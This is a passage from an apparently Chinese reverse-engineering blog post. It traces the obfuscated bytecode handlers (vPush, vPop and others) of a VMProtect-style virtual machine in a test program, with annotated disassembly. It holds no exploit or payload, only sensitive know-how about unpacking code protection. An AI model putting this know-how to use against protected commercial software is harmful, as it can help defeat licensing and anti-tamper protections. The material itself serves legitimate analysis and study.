class=\"line\">0044534C    33CB             xor ecx,ebx</span><br><span class=\"line\">0044534E    C1C9 02          ror ecx,0x2</span><br><span class=\"line\">00445351    81F1 7E7F9C09    xor ecx,0x99C7F7E</span><br><span class=\"line\">00478CFC    49               dec ecx</span><br><span class=\"line\">00478CFD    81F1 F25E4677    xor ecx,0x77465EF2</span><br><span class=\"line\">0046EDD9    81C1 1A29644A    add ecx,0x4A64291A</span><br><span class=\"line\">0046EDE5    33D9             xor ebx,ecx</span><br><span class=\"line\">0046EDEA    03E9             add ebp,ecx</span><br><span class=\"line\">0043713E    55               push ebp                                                      </span><br><span class=\"line\">0043713F    C3               retn\t\t;0x00437854</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">mov \teax,dword ptr ds:[v_esp]\t;变量a地址</span><br><span class=\"line\">mov\tedx,dword ptr ds:[eax]\t;</span><br><span class=\"line\">mov\tdword ptr ds:[v_esp],edx</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"把变量a的值存放栈顶-1\"><a href=\"#把变量a的值存放栈顶-1\" class=\"headerlink\" title=\"把变量a的值存放栈顶\"></a>把变量a的值存放栈顶</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">00437854    8B16             mov edx,dword ptr ds:[esi]</span><br><span class=\"line\">00437858    36:8B02          mov eax,dword ptr ss:[edx]</span><br><span class=\"line\">0043785C    8906             mov dword ptr ds:[esi],eax\t\t;把变量a的值读出来后存放值v_stack栈顶</span><br><span class=\"line\">00437863    8B07             mov eax,dword ptr ds:[edi]</span><br><span class=\"line\">00437865    8DBF 04000000    lea edi,dword ptr ds:[edi+0x4]</span><br><span class=\"line\">0043786D    33C3             xor eax,ebx                                                  </span><br><span class=\"line\">0043786F    05 84307C17      add eax,0x177C3084</span><br><span class=\"line\">00480A5B    0FC8             bswap eax</span><br><span class=\"line\">0041D7F7    40               inc eax</span><br><span class=\"line\">0041D7FC    F7D0             not eax</span><br><span class=\"line\">0041D7FE    33D8             xor ebx,eax</span><br><span class=\"line\">0041D803    03E8             add ebp,eax</span><br><span class=\"line\">0042FA74    55               push ebp                                                   </span><br><span class=\"line\">0042FA75    C3               retn\t;0x00474E9C</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"vPop-r12-3\"><a href=\"#vPop-r12-3\" class=\"headerlink\" title=\"vPop r12\"></a>vPop r12</h3><blockquote>\n<p>将变量a的值保存到寄存器R12,相当于mov\tecx,dword ptr [ebp-4] </p>\n</blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">00474E9C    8B0E             mov ecx,dword ptr ds:[esi]</span><br><span class=\"line\">00474EA0    81C6 04000000    add esi,0x4</span><br><span class=\"line\">00474EAB    0FB607           movzx eax,byte ptr ds:[edi]</span><br><span class=\"line\">00474EAE    81C7 01000000    add edi,0x1</span><br><span class=\"line\">00474EB6    32C3             xor al,bl</span><br><span class=\"line\">00445C08    04 95            add al,0x95</span><br><span class=\"line\">00445C0B    F6D8             neg al</span><br><span class=\"line\">00483885    FEC0             inc al</span><br><span class=\"line\">00483887    34 28            xor al,0x28</span><br><span class=\"line\">0048388A    32D8             xor bl,al</span><br><span class=\"line\">00483890    890C04           mov dword ptr ss:[esp+eax],ecx</span><br><span class=\"line\">00483895    8B0F             mov ecx,dword ptr ds:[edi]</span><br><span class=\"line\">004376C4    8DBF 04000000    lea edi,dword ptr ds:[edi+0x4]</span><br><span class=\"line\">004745C8    33CB             xor ecx,ebx                                                  </span><br><span class=\"line\">0044E82C    C1C9 02          ror ecx,0x2</span><br><span class=\"line\">0044E82F    81F1 7E7F9C09    xor ecx,0x99C7F7E</span><br><span class=\"line\">004072B5    81F1 F25E4677    xor ecx,0x77465EF2</span><br><span class=\"line\">004072BB    81C1 1A29644A    add ecx,0x4A64291A</span><br><span class=\"line\">004072C5    33D9             xor ebx,ecx                                           </span><br><span class=\"line\">004072C9    03E9             add ebp,ecx</span><br><span class=\"line\">00471DC6    55               push ebp                                                      </span><br><span class=\"line\">00471DC7    C3               retn\t;0x00405372</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"vPush-R12\"><a href=\"#vPush-R12\" class=\"headerlink\" title=\"vPush R12\"></a>vPush R12</h3><blockquote>\n<p>push ecx</p>\n</blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">00405372    0FB60F           movzx ecx,byte ptr ds:[edi]</span><br><span class=\"line\">0040537B    81C7 01000000    add edi,0x1</span><br><span class=\"line\">00405384    32CB             xor cl,bl</span><br><span class=\"line\">00405389    F6D9             neg cl</span><br><span class=\"line\">0040538D    80F1 0E          xor cl,0xE</span><br><span class=\"line\">00405393    80E9 21          sub cl,0x21</span><br><span class=\"line\">00405396    F6D9             neg cl</span><br><span class=\"line\">004053A0    80F1 E2          xor cl,0xE2</span><br><span class=\"line\">004053A8    32D9             xor bl,cl</span><br><span class=\"line\">004053B1    8B140C           mov edx,dword ptr ss:[esp+ecx]</span><br><span class=\"line\">004053B9    8DB6 FCFFFFFF    lea esi,dword ptr ds:[esi-0x4]</span><br><span class=\"line\">004053C4    8916             mov dword ptr ds:[esi],edx</span><br><span class=\"line\">004053C9    8B0F             mov ecx,dword ptr ds:[edi]</span><br><span class=\"line\">00474617    8DBF 04000000    lea edi,dword ptr ds:[edi+0x4]</span><br><span class=\"line\">00474622    33CB             xor ecx,ebx</span><br><span class=\"line\">0047462F    81E9 8C1F9123    sub ecx,0x23911F8C</span><br><span class=\"line\">00474636    D1C9             ror ecx,1</span><br><span class=\"line\">004863EB    49               dec ecx</span><br><span class=\"line\">00435EA6    F7D1             not ecx</span><br><span class=\"line\">00435EAE    33D9             xor ebx,ecx</span><br><span class=\"line\">00435EB8    03E9             add ebp,ecx</span><br><span class=\"line\">00462636    8D5424 60        lea edx,dword ptr ss:[esp+0x60]</span><br><span class=\"line\">0046263A    3BF2             cmp esi,edx</span><br><span class=\"line\">00481402  ^\\0F87 04A9FCFF    ja test1_vm.0044BD0C</span><br><span class=\"line\">00481408    8BC4             mov eax,esp</span><br><span class=\"line\">0048140A    B9 40000000      mov ecx,0x40</span><br><span class=\"line\">0048140F    8D5426 80        lea edx,dword ptr ds:[esi-0x80]</span><br><span class=\"line\">00467341    81E2 FCFFFFFF    and edx,-0x4</span><br><span class=\"line\">00467347    2BD1             sub edx,ecx</span><br><span class=\"line\">00467349    8BE2             mov esp,edx</span><br><span class=\"line\">0046734B    57               push edi                                             </span><br><span class=\"line\">0045A32C    56               push esi</span><br><span class=\"line\">0045A330    9C               pushfd</span><br><span class=\"line\">00489ACC    8BF0             mov esi,eax                                            </span><br><span class=\"line\">00489AD2    8BFA             mov edi,edx</span><br><span class=\"line\">0045B5BE    F3:A4            rep movs byte ptr es:[edi],byte ptr ds:[esi]</span><br><span class=\"line\">0045B5C2    9D               popfd</span><br><span class=\"line\">0045818E    5E               pop esi                                                                                                 ; test1_vm.0043D162</span><br><span class=\"line\">00458194    5F               pop edi                                                   </span><br><span class=\"line\">0044BD0C    55               push ebp                                                     </span><br><span class=\"line\">0044BD0D    C3               retn\t\t\t//0x004357B8</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"vPush-4020FCh\"><a href=\"#vPush-4020FCh\" class=\"headerlink\" title=\"vPush 4020FCh\"></a>vPush 4020FCh</h3><blockquote>\n<p>push “%d\\n”</p>\n</blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">004357B8    8B0F             mov ecx,dword ptr ds:[edi]</span><br><span class=\"line\">004357BD    8DBF 04000000    lea edi,dword ptr ds:[edi+0x4]</span><br><span class=\"line\">004357C5    33CB             xor ecx,ebx</span><br><span class=\"line\">004357D0    F7D9             neg ecx</span><br><span class=\"line\">004357D2    41               inc ecx</span><br><span class=\"line\">004357D5    81F1 66772375    xor ecx,0x75237766</span><br><span class=\"line\">004357E1    33D9             xor ebx,ecx</span><br><span class=\"line\">004357E3    81EE 04000000    sub esi,0x4</span><br><span class=\"line\">004357EA    890E             mov dword ptr ds:[esi],ecx</span><br><span class=\"line\">004357EC    8B0F             mov ecx,dword ptr ds:[edi]</span><br><span class=\"line\">004357EE    81C7 04000000    add edi,0x4</span><br><span class=\"line\">004357F8    33CB             xor ecx,ebx</span><br><span class=\"line\">004357FA    F7D9             neg ecx</span><br><span class=\"line\">00435802    8D89 6233DE7C    lea ecx,dword ptr ds:[ecx+0x7CDE3362]</span><br><span class=\"line\">0043580F    F7D1             not ecx</span><br><span class=\"line\">0043581A    33D9             xor ebx,ecx</span><br><span class=\"line\">0043581C    03E9             add ebp,ecx</span><br><span class=\"line\">00462636    8D5424 60        lea edx,dword ptr ss:[esp+0x60]</span><br><span class=\"line\">0046263A    3BF2             cmp esi,edx</span><br><span class=\"line\">00481402  ^\\0F87 04A9FCFF    ja test1_vm.0044BD0C</span><br><span class=\"line\">00481408    8BC4             mov eax,esp</span><br><span class=\"line\">0048140A    B9 40000000      mov ecx,0x40</span><br><span class=\"line\">0048140F    8D5426 80        lea edx,dword ptr ds:[esi-0x80]</span><br><span class=\"line\">00467341    81E2 FCFFFFFF    and edx,-0x4</span><br><span class=\"line\">00467347    2BD1             sub edx,ecx</span><br><span class=\"line\">00467349    8BE2             mov esp,edx</span><br><span class=\"line\">0046734B    57               push edi                                                   </span><br><span class=\"line\">0045A32C    56               push esi</span><br><span class=\"line\">0045A330    9C               pushfd</span><br><span class=\"line\">00489ACC    8BF0             mov esi,eax                                           </span><br><span class=\"line\">00489AD2    8BFA             mov edi,edx</span><br><span class=\"line\">0045B5BE    F3:A4            rep movs byte ptr es:[edi],byte ptr ds:[esi]</span><br><span class=\"line\">0045B5C2    9D               popfd</span><br><span class=\"line\">0045818E    5E               pop esi                                                                                           ; test1_vm.0043D167</span><br><span class=\"line\">00458194    5F               pop edi                                                   </span><br><span class=\"line\">0044BD0C    55               push ebp                                                    </span><br><span class=\"line\">0044BD0D    C3               retn\t\t\t;0x0043AA20</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"vPush-VMEntry\"><a href=\"#vPush-VMEntry\" class=\"headerlink\" title=\"vPush VMEntry\"></a>vPush VMEntry</h3><blockquote>\n<p>重新进入虚拟机的入口,也就是printf执行完毕后的返回地址</p>\n</blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">0043AA20    8B0F             mov ecx,dword ptr ds:[edi]</span><br><span class=\"line\">0043AA26    81C7 04000000    add edi,0x4</span><br><span class=\"line\">0043AA2E    33CB             xor ecx,ebx</span><br><span class=\"line\">0047C322    F7D9             neg ecx</span><br><span class=\"line\">0047C324    41               inc ecx</span><br><span class=\"line\">0047C32B    81F1 66772375    xor ecx,0x75237766</span><br><span class=\"line\">0042C668    33D9             xor ebx,ecx</span><br><span class=\"line\">0042C66B    81EE 04000000    sub esi,0x4</span><br><span class=\"line\">0042C674    890E             mov dword ptr ds:[esi],ecx</span><br><span class=\"line\">0042C67F    8B0F             mov ecx,dword ptr ds:[edi]</span><br><span class=\"line\">0042C687    8DBF 04000000    lea edi,dword ptr ds:[edi+0x4]</span><br><span class=\"line\">0042C699    33CB             xor ecx,ebx</span><br><span class=\"line\">0045ED4D    F7D9             neg ecx</span><br><span class=\"line\">0045ED4F    8D89 6233DE7C    lea ecx,dword ptr ds:[ecx+0x7CDE3362]</span><br><span class=\"line\">0045ED55    F7D9             neg ecx</span><br><span class=\"line\">0045ED5D    F7D1             not ecx</span><br><span class=\"line\">0045ED60    33D9             xor ebx,ecx</span><br><span class=\"line\">00446EEF    03E9             add ebp,ecx</span><br><span class=\"line\">00462636    8D5424 60        lea edx,dword ptr ss:[esp+0x60]</span><br><span class=\"line\">0046263A    3BF2             cmp esi,edx</span><br><span class=\"line\">00481402  ^\\0F87 04A9FCFF    ja test1_vm.0044BD0C</span><br><span class=\"line\">00481408    8BC4             mov eax,esp</span><br><span class=\"line\">0048140A    B9 40000000      mov ecx,0x40</span><br><span class=\"line\">0048140F    8D5426 80        lea edx,dword ptr ds:[esi-0x80]</span><br><span class=\"line\">00467341    81E2 FCFFFFFF    and edx,-0x4</span><br><span class=\"line\">00467347    2BD1             sub edx,ecx</span><br><span class=\"line\">00467349    8BE2             mov esp,edx</span><br><span class=\"line\">0046734B    57               push edi                                                     </span><br><span class=\"line\">0045A32C    56               push esi</span><br><span class=\"line\">0045A32D    0FB7F2           movzx esi,dx</span><br><span class=\"line\">0045A330    9C               pushfd</span><br><span class=\"line\">00489ACC    8BF0             mov esi,eax                                             </span><br><span class=\"line\">00489AD2    8BFA             mov edi,edx</span><br><span class=\"line\">0045B5BE    F3:A4            rep movs byte ptr es:[edi],byte ptr ds:[esi]</span><br><span class=\"line\">0045B5C2    9D               popfd</span><br><span class=\"line\">0045818E    5E               pop esi                                                                                            ; test1_vm.0043D16F</span><br><span class=\"line\">00458194    5F               pop edi                                                     </span><br><span class=\"line\">0044BD0C    55               push ebp                                                    </span><br><span class=\"line\">0044BD0D    C3               retn\t;0x0044A38D</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"vPush-printf\"><a href=\"#vPush-printf\" class=\"headerlink\" title=\"vPush printf\"></a>vPush printf</h3><blockquote>\n<p>将printf函数地址压入栈</p>\n</blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">0044A38D    8B0F             mov ecx,dword ptr ds:[edi]</span><br><span class=\"line\">0044A38F    81C7 04000000    add edi,0x4</span><br><span class=\"line\">0044A395    33CB             xor ecx,ebx</span><br><span class=\"line\">00441810    41               inc ecx</span><br><span class=\"line\">00441816    F7D9             neg ecx</span><br><span class=\"line\">0041C24A    41               inc ecx</span><br><span class=\"line\">0041C250    81F1 66772375    xor ecx,0x75237766</span><br><span class=\"line\">0041C259    33D9             xor ebx,ecx</span><br><span class=\"line\">0041C260    8DB6 FCFFFFFF    lea esi,dword ptr ds:[esi-0x4]</span><br><span class=\"line\">0041C26A    890E             mov dword ptr ds:[esi],ecx</span><br><span class=\"line\">0041C270    8B0F             mov ecx,dword ptr ds:[edi]</span><br><span class=\"line\">0041C273    81C7 04000000    add edi,0x4</span><br><span class=\"line\">0041C279    33CB             xor ecx,ebx</span><br><span class=\"line\">0041C27B    F7D9             neg ecx</span><br><span class=\"line\">0041C286    8D89 6233DE7C    lea ecx,dword ptr ds:[ecx+0x7CDE3362]</span><br><span class=\"line\">0041C28C    F7D9             neg ecx</span><br><span class=\"line\">00435617    F7D1             not ecx</span><br><span class=\"line\">0043561B    33D9             xor ebx,ecx</span><br><span class=\"line\">00435622    03E9             add ebp,ecx</span><br><span class=\"line\">00462636    8D5424 60        lea edx,dword ptr ss:[esp+0x60]</span><br><span class=\"line\">0046263A    3BF2             cmp esi,edx</span><br><span class=\"line\">00481402  ^\\0F87 04A9FCFF    ja test1_vm.0044BD0C</span><br><span class=\"line\">00481408    8BC4             mov eax,esp</span><br><span class=\"line\">0048140A    B9 40000000      mov ecx,0x40</span><br><span class=\"line\">0048140F    8D5426 80        lea edx,dword ptr ds:[esi-0x80]</span><br><span class=\"line\">00467341    81E2 FCFFFFFF    and edx,-0x4</span><br><span class=\"line\">00467347    2BD1             sub edx,ecx</span><br><span class=\"line\">00467349    8BE2             mov esp,edx</span><br><span class=\"line\">0046734B    57               push edi                                                     </span><br><span class=\"line\">0045A32C    56               push esi</span><br><span class=\"line\">0045A32D    0FB7F2           movzx esi,dx</span><br><span class=\"line\">0045A330    9C               pushfd</span><br><span class=\"line\">00489ACC    8BF0             mov esi,eax                                                </span><br><span class=\"line\">00489AD2    8BFA             mov edi,edx</span><br><span class=\"line\">0045B5BE    F3:A4            rep movs byte ptr es:[edi],byte ptr ds:[esi]</span><br><span class=\"line\">0045B5C2    9D               popfd</span><br><span class=\"line\">0045818E    5E               pop esi                                                                                                ; test1_vm.0043D177</span><br><span class=\"line\">00458194    5F               pop edi                                                     </span><br><span class=\"line\">0044BD0C    55               push ebp                                                      </span><br><span class=\"line\">0044BD0D    C3               retn\t\t\t;0x004126A8</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"vPush-R4-2\"><a href=\"#vPush-R4-2\" class=\"headerlink\" title=\"vPush R4(2)\"></a>vPush R4(2)</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">004126A8    0FB60F           movzx ecx,byte ptr ds:[edi]</span><br><span class=\"line\">004126B4    8DBF 01000000    lea edi,dword ptr ds:[edi+0x1]</span><br><span class=\"line\">004126C0    32CB             xor cl,bl</span><br><span class=\"line\">004126C4    F6D9             neg cl</span><br><span class=\"line\">004126CD    80F1 0E          xor cl,0xE</span><br><span class=\"line\">004126D3    80E9 21          sub cl,0x21</span><br><span class=\"line\">004126DF    F6D9             neg cl</span><br><span class=\"line\">004126E1    80F1 E2          xor cl,0xE2</span><br><span class=\"line\">004126E4    32D9             xor bl,cl</span><br><span class=\"line\">004126E6    8B140C           mov edx,dword ptr ss:[esp+ecx]</span><br><span class=\"line\">004126F0    8DB6 FCFFFFFF    lea esi,dword ptr ds:[esi-0x4]</span><br><span class=\"line\">004126F6    8916             mov dword ptr ds:[esi],edx\t\t</span><br><span class=\"line\">004126FE    8B0F             mov ecx,dword ptr ds:[edi]</span><br><span class=\"line\">00412702    81C7 04000000    add edi,0x4</span><br><span class=\"line\">0041270D    33CB             xor ecx,ebx</span><br><span class=\"line\">00412718    81E9 8C1F9123    sub ecx,0x23911F8C</span><br><span class=\"line\">0041271F    D1C9             ror ecx,1</span><br><span class=\"line\">00412721    49               dec ecx</span><br><span class=\"line\">00489F7A    F7D1             not ecx</span><br><span class=\"line\">00445362    33D9             xor ebx,ecx</span><br><span class=\"line\">00445369    03E9             add ebp,ecx</span><br><span class=\"line\">00462636    8D5424 60        lea edx,dword ptr ss:[esp+0x60]</span><br><span class=\"line\">0046263A    3BF2             cmp esi,edx</span><br><span class=\"line\">00481402  ^\\0F87 04A9FCFF    ja test1_vm.0044BD0C</span><br><span class=\"line\">00481408    8BC4             mov eax,esp</span><br><span class=\"line\">0048140A    B9 40000000      mov ecx,0x40</span><br><span class=\"line\">0048140F    8D5426 80        lea edx,dword ptr ds:[esi-0x80]</span><br><span class=\"line\">00467341    81E2 FCFFFFFF    and edx,-0x4</span><br><span class=\"line\">00467347    2BD1             sub edx,ecx</span><br><span class=\"line\">00467349    8BE2             mov esp,edx</span><br><span class=\"line\">0046734B    57               push edi                                                     </span><br><span class=\"line\">0045A32C    56               push esi</span><br><span class=\"line\">0045A32D    0FB7F2           movzx esi,dx</span><br><span class=\"line\">0045A330    9C               pushfd</span><br><span class=\"line\">00489ACC    8BF0             mov esi,eax                                              </span><br><span class=\"line\">00489AD2    8BFA             mov edi,edx</span><br><span class=\"line\">0045B5BE    F3:A4            rep movs byte ptr es:[edi],byte ptr ds:[esi]</span><br><span class=\"line\">0045B5C2    9D               popfd</span><br><span class=\"line\">0045818E    5E               pop esi                                                                                                     ; test1_vm.0043D17F</span><br><span class=\"line\">00458194    5F               pop edi                                                      </span><br><span class=\"line\">0044BD0C    55               push ebp                                                     </span><br><span class=\"line\">0044BD0D    C3               retn\t;0x0047B785</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"vPush-R5-2\"><a href=\"#vPush-R5-2\" class=\"headerlink\" title=\"vPush R5(2)\"></a>vPush R5(2)</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">0047B785    0FB60F           movzx ecx,byte ptr ds:[edi]</span><br><span class=\"line\">0047B790    8DBF 01000000    lea edi,dword ptr ds:[edi+0x1]</span><br><span class=\"line\">0047B79E    32CB             xor cl,bl</span><br><span class=\"line\">0047B7AA    F6D9             neg cl</span><br><span class=\"line\">0047B7AC    80F1 0E          xor cl,0xE</span><br><span class=\"line\">0047B7B3    80E9 21          sub cl,0x21</span><br><span class=\"line\">0040EEF9    F6D9             neg cl</span><br><span class=\"line\">0040EEFE    80F1 E2          xor cl,0xE2</span><br><span class=\"line\">0040EF01    32D9             xor bl,cl</span><br><span class=\"line\">0040EF07    8B140C           mov edx,dword ptr ss:[esp+ecx]</span><br><span class=\"line\">0040EF0D    8DB6 FCFFFFFF    lea esi,dword ptr ds:[esi-0x4]</span><br><span class=\"line\">0040EF17    8916             mov dword ptr ds:[esi],edx</span><br><span class=\"line\">0040EF20    8B0F             mov ecx,dword ptr ds:[edi]</span><br><span class=\"line\">0040EF22    8DBF 04000000    lea edi,dword ptr ds:[edi+0x4]</span><br><span class=\"line\">0040EF28    33CB             xor ecx,ebx</span><br><span class=\"line\">0040EF2A    81E9 8C1F9123    sub ecx,0x23911F8C</span><br><span class=\"line\">0040EF32    D1C9             ror ecx,1</span><br><span class=\"line\">00430F23    49               dec ecx</span><br><span class=\"line\">00430F29    F7D1             not ecx</span><br><span class=\"line\">00430F2B    33D9             xor ebx,ecx</span><br><span class=\"line\">00430F2E    03E9             add ebp,ecx</span><br><span class=\"line\">00462636    8D5424 60        lea edx,dword ptr ss:[esp+0x60]</span><br><span class=\"line\">0046263A    3BF2             cmp esi,edx</span><br><span class=\"line\">00481402  ^\\0F87 04A9FCFF    ja test1_vm.0044BD0C</span><br><span class=\"line\">00481408    8BC4             mov eax,esp</span><br><span class=\"line\">0048140A    B9 40000000      mov ecx,0x40</span><br><span class=\"line\">0048140F    8D5426 80        lea edx,dword ptr ds:[esi-0x80]</span><br><span class=\"line\">00467341    81E2 FCFFFFFF    and edx,-0x4</span><br><span class=\"line\">00467347    2BD1             sub edx,ecx</span><br><span class=\"line\">00467349    8BE2             mov esp,edx</span><br><span class=\"line\">0046734B    57               push edi                                                    </span><br><span class=\"line\">0045A32C    56               push esi</span><br><span class=\"line\">0045A32D    0FB7F2           movzx esi,dx</span><br><span class=\"line\">0045A330    9C               pushfd</span><br><span class=\"line\">00489ACC    8BF0             mov esi,eax                                               </span><br><span class=\"line\">00489AD2    8BFA             mov edi,edx</span><br><span class=\"line\">0045B5BE    F3:A4            rep movs byte ptr es:[edi],byte ptr ds:[esi]</span><br><span class=\"line\">0045B5C2    9D               popfd</span><br><span class=\"line\">0045818E    5E               pop esi                                                      </span><br><span class=\"line\">00458194    5F               pop edi                                                      </span><br><span class=\"line\">0044BD0C    55               push ebp                                                      </span><br><span class=\"line\">0044BD0D    C3               retn\t;0x0045325C</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"vPush\"><a href=\"#vPush\" class=\"headerlink\" title=\"vPush\"></a>vPush</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">0045325C    0FB60F           movzx ecx,byte ptr ds:[edi]</span><br><span class=\"line\">00453267    8DBF 01000000    lea edi,dword ptr ds:[edi+0x1]</span><br><span class=\"line\">0045326D    32CB             xor cl,bl</span><br><span class=\"line\">0045326F    F6D9             neg cl</span><br><span class=\"line\">00453272    80F1 0E          xor cl,0xE</span><br><span class=\"line\">00453278    80E9 21          sub cl,0x21</span><br><span class=\"line\">00453282    F6D9             neg cl                                              </span><br><span class=\"line\">0045328E    80F1 E2          xor cl,0xE2</span><br><span class=\"line\">00453291    80EA 48          sub dl,0x48</span><br><span class=\"line\">00453296    32D9             xor bl,cl</span><br><span class=\"line\">004532A5    8B140C           mov edx,dword ptr ss:[esp+ecx]</span><br><span class=\"line\">004532A8    81EE 04000000    sub esi,0x4</span><br><span class=\"line\">004532B4    8916             mov dword ptr ds:[esi],edx</span><br><span class=\"line\">004532BD    8B0F             mov ecx,dword ptr ds:[edi]</span><br><span class=\"line\">004532C4    8DBF 04000000    lea edi,dword ptr ds:[edi+0x4]</span><br><span class=\"line\">0041B011    33CB             xor ecx,ebx</span><br><span class=\"line\">0041B018    81E9 8C1F9123    sub ecx,0x23911F8C</span><br><span class=\"line\">0041B01E    D1C9             ror ecx,1</span><br><span class=\"line\">004692ED    49               dec ecx</span><br><span class=\"line\">004692F3    F7D1             not ecx</span><br><span class=\"line\">004692FA    33D9             xor ebx,ecx</span><br><span class=\"line\">004692FC    03E9             add ebp,ecx</span><br><span class=\"line\">00462636    8D5424 60        lea edx,dword ptr ss:[esp+0x60]</span><br><span class=\"line\">0046263A    3BF2             cmp esi,edx</span><br><span class=\"line\">00481402  ^\\0F87 04A9FCFF    ja test1_vm.0044BD0C</span><br><span class=\"line\">00481408    8BC4             mov eax,esp</span><br><span class=\"line\">0048140A    B9 40000000      mov ecx,0x40</span><br><span class=\"line\">0048140F    8D5426 80        lea edx,dword ptr ds:[esi-0x80]</span><br><span class=\"line\">00467341    81E2 FCFFFFFF    and edx,-0x4</span><br><span class=\"line\">00467347    2BD1             sub edx,ecx</span><br><span class=\"line\">00467349    8BE2             mov esp,edx</span><br><span class=\"line\">0046734B    57               push edi                                                     </span><br><span class=\"line\">0045A32C    56               push esi</span><br><span class=\"line\">0045A32D    0FB7F2           movzx esi,dx</span><br><span class=\"line\">0045A330    9C               pushfd</span><br><span class=\"line\">00489ACC    8BF0             mov esi,eax                                            </span><br><span class=\"line\">00489AD2    8BFA             mov edi,edx</span><br><span class=\"line\">0045B5BE    F3:A4            rep movs byte ptr es:[edi],byte ptr ds:[esi]</span><br><span class=\"line\">0045B5C2    9D               popfd</span><br><span class=\"line\">0045818E    5E               pop esi                                                                                              ; test1_vm.0043D189</span><br><span class=\"line\">00458194    5F               pop edi                                                     </span><br><span class=\"line\">0044BD0C    55               push ebp                                                    </span><br><span class=\"line\">0044BD0D    C3               retn\t;0x0045225C</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"vPush-1\"><a href=\"#vPush-1\" class=\"headerlink\" title=\"vPush\"></a>vPush</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">0045225C    0FB60F           movzx ecx,byte ptr ds:[edi]                                         </span><br><span class=\"line\">00452265    8DBF 01000000    lea edi,dword ptr ds:[edi+0x1]</span><br><span class=\"line\">0045226B    32CB             xor cl,bl</span><br><span class=\"line\">0045226D    F6D9             neg cl</span><br><span class=\"line\">00452273    80F1 0E          xor cl,0xE</span><br><span class=\"line\">0045227D    80E9 21          sub cl,0x21</span><br><span class=\"line\">0045228B    F6D9             neg cl</span><br><span class=\"line\">0045228D    80F1 E2          xor cl,0xE2</span><br><span class=\"line\">00452292    32D9             xor bl,cl</span><br><span class=\"line\">00452297    8B140C           mov edx,dword ptr ss:[esp+ecx]</span><br><span class=\"line\">0045229A    81EE 04000000    sub esi,0x4</span><br><span class=\"line\">004522AE    8916             mov dword ptr ds:[esi],edx</span><br><span class=\"line\">004522B0    8B0F             mov ecx,dword ptr ds:[edi]</span><br><span class=\"line\">004522B3    8DBF 04000000    lea edi,dword ptr ds:[edi+0x4]</span><br><span class=\"line\">004522BE    33CB             xor ecx,ebx</span><br><span class=\"line\">0045676E    81E9 8C1F9123    sub ecx,0x23911F8C</span><br><span class=\"line\">00456776    D1C9             ror ecx,1</span><br><span class=\"line\">00463F87    49               dec ecx</span><br><span class=\"line\">00463F8C    F7D1             not ecx</span><br><span class=\"line\">0041EFFB    33D9             xor ebx,ecx</span><br><span class=\"line\">0041F001    03E9             add ebp,ecx</span><br><span class=\"line\">00462636    8D5424 60        lea edx,dword ptr ss:[esp+0x60]</span><br><span class=\"line\">0046263A    3BF2             cmp esi,edx</span><br><span class=\"line\">00481402  ^\\0F87 04A9FCFF    ja test1_vm.0044BD0C</span><br><span class=\"line\">00481408    8BC4             mov eax,esp</span><br><span class=\"line\">0048140A    B9 40000000      mov ecx,0x40</span><br><span class=\"line\">0048140F    8D5426 80        lea edx,dword ptr ds:[esi-0x80]</span><br><span class=\"line\">00467341    81E2 FCFFFFFF    and edx,-0x4</span><br><span class=\"line\">00467347    2BD1             sub edx,ecx</span><br><span class=\"line\">00467349    8BE2             mov esp,edx</span><br><span class=\"line\">0046734B    57               push edi                                                   </span><br><span class=\"line\">0045A32C    56               push esi</span><br><span class=\"line\">0045A330    9C               pushfd</span><br><span class=\"line\">00489ACC    8BF0             mov esi,eax                                            </span><br><span class=\"line\">00489AD2    8BFA             mov edi,edx</span><br><span class=\"line\">0045B5BE    F3:A4            rep movs byte ptr es:[edi],byte ptr ds:[esi]</span><br><span class=\"line\">0045B5C2    9D               popfd</span><br><span class=\"line\">0045818E    5E               pop esi                                                                   </span><br><span class=\"line\">00458194    5F               pop edi                                                     </span><br><span class=\"line\">0044BD0C    55               push ebp                                                    </span><br><span class=\"line\">0044BD0D    C3               retn\t\t;0x0047E64B</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"vPush-2\"><a href=\"#vPush-2\" class=\"headerlink\" title=\"vPush\"></a>vPush</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">0047E64B    0FB60F           movzx ecx,byte ptr ds:[edi]</span><br><span class=\"line\">0047E661    32CB             xor cl,bl</span><br><span class=\"line\">0047E663    F6D9             neg cl</span><br><span class=\"line\">0047E66B    80F1 0E          xor cl,0xE</span><br><span class=\"line\">0047E670    80E9 21          sub cl,0x21</span><br><span class=\"line\">0047E681    F6D9             neg cl</span><br><span class=\"line\">0047E683    80F1 E2          xor cl,0xE2</span><br><span class=\"line\">0047E686    32D9             xor bl,cl</span><br><span class=\"line\">0047E68E    8B140C           mov edx,dword ptr ss:[esp+ecx]</span><br><span class=\"line\">0047E697    81EE 04000000    sub esi,0x4</span><br><span class=\"line\">0047E6A2    8916             mov dword ptr ds:[esi],edx</span><br><span class=\"line\">0047E6AC    8B0F             mov ecx,dword ptr ds:[edi]</span><br><span class=\"line\">0047E6B4    81C7 04000000    add edi,0x4</span><br><span class=\"line\">0047E6BA    66:81FE 6D64     cmp si,0x646D</span><br><span class=\"line\">0047E6BF    